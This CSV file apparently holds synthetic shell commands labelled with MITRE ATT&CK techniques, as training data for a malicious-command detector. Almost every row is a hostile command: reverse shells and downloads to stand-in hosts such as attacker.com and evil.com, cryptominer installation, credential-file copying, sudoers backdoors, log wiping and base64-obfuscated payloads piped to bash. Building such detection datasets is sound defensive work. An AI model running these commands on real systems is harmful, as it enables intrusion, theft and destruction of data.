command,features,label,source
"python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1132_Data_Encoding'],synthetic
"python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'c3NoIGFkbWluQGxvY2FsaG9zdA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup ip route show &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"python3 auto_collector.py --dirs /home,/etc --ext pdf,docx,kdbx ; sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1119_Automated_Collection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemd-detect-virt | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
time msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
sudo dnscat2 --secret=mysecret attacker.com | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1048_Exfiltration_Over_Alternative_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
> ~/.bash_history && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
time openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/enc_shadow,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1132_Data_Encoding'],synthetic
time xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && > /dev/null 2>&1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find  /var/log  -name  '*.log'  -exec  truncate  -s  0  {}  \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
sudo xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5 | chmod +x /tmp/payload,"[1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time ./CVE-2021-4034 ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/ ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1176_Browser_Extensions', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-ADDefaultDomainPasswordPolicy | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1201_Password_Policy_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
install -m 755 payload /usr/local/bin/update-manager,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1036_Masquerading'],synthetic
sudo useradd -m -s /bin/bash hacker ; chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hping3 --icmp --data 1000 10.0.0.99,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1095_Non_Application_Layer_Protocol'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in && chmod +x /tmp/payload""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZmZtcGVnIC1mIGFsc2EgLWkgZGVmYXVsdCAtdCA2MCAvdG1wL21pYy5tcDM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1123_Audio_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
openssl enc -aes-256-cbc -d -in /tmp/enc_payload -out /tmp/payload,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
bitsadmin /transfer myJob http://attacker.com/payload.exe %TEMP%\payload.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1197_BITS_Jobs'],synthetic
msiexec /quiet /i http://evil.com/payload.msi,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
wmic useraccount list ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time unzip archive.zip -d /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
wmic process call create 'cmd.exe /c whoami' ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1047_Windows_Management_Instrumentation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1218_System_Binary_Proxy_Execution'],synthetic
"bash -c ""hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; sleep 1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
env | grep PATH,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['BENIGN'],synthetic
python3 exploit.py --target localhost ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
python3 eternalblue.py 10.0.0.5 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1210_Exploitation_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sox -t alsa default /tmp/recording.wav trim 0 120,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
python3  decrypt_chrome_cookies.py  --profile  ~/.config/google-chrome/Default,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup getent group sudo && sleep 1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 exploit.py --target localhost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cp /usr/bin/python3 /tmp/systemd | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1036_Masquerading', 'T1059_Command_and_Scripting_Interpreter']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.48, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ln  -s  /bin/bash  /tmp/kworker  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1036_Masquerading', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-ADDefaultDomainPasswordPolicy,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
id -u | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
mkdir /tmp/.staging && cp -r /home/*/.ssh /tmp/.staging/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1074_Data_Staged'],synthetic
ptrace inject $(pgrep bash) /tmp/shellcode ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1055_Process_Injection', 'T1059_Command_and_Scripting_Interpreter']",synthetic
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo 'YW5zaWJsZSAtbSBzaGVsbCAtYSAnY3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNoJyBhbGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1072_Software_Deployment_Tools', 'T1027_Obfuscated_Files_or_Information']",synthetic
locate wp-config.php,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
systemctl enable --now malicious.service | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
nohup echo 'TERfUFJFTE9BRD0vdG1wL2V2aWwuc28gL3Vzci9iaW4vc3VkbyB3aG9hbWk=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1055_Process_Injection', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
dmesg | grep -i 'virtual\|vmware\|kvm\|xen',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.8, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
find ~/.mozilla -name '*.xpi' -exec cp {} /tmp/ \;,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1176_Browser_Extensions'],synthetic
cat /proc/version | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUn'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
cp /etc/hosts /tmp/hosts.bak,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
dmesg | grep -i 'virtual\|vmware\|kvm\|xen',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.8, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/enc_shadow ; history -c,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1132_Data_Encoding', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
"python3  -c  ""import  base64;  exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
./pwnkit && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"time python3 -c ""from PIL import ImageGrab; ImageGrab.grab().save('/tmp/s.png')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1113_Screen_Capture'],synthetic
bash  -i  >&  /dev/tcp/10.0.0.99/4444  0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJzIDsgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cmVnIHF1ZXJ5IEhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1012_Query_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap  --script=vuln  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y2hhZ2UgLWwgcm9vdCB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1201_Password_Policy_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
time echo 'cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwuY29tL2ZpbGUuc2N0IHNjcm9iai5kbGwgOyA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
net accounts /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
sudo Start-BitsTransfer -Source http://evil.com/shell.exe -Destination $env:TEMP && chmod +x /tmp/payload,"[0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1197_BITS_Jobs', 'T1059_Command_and_Scripting_Interpreter']",synthetic
msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5; run',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1210_Exploitation_Remote_Services'],synthetic
echo  '@reboot  /tmp/.xmr/xmrig  -o  pool.minexmr.com'  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup systemd-detect-virt &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
cat /etc/openvpn/*.conf && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1005_Data_from_Local_System', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""systemctl enable --now malicious.service ; echo done""","[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
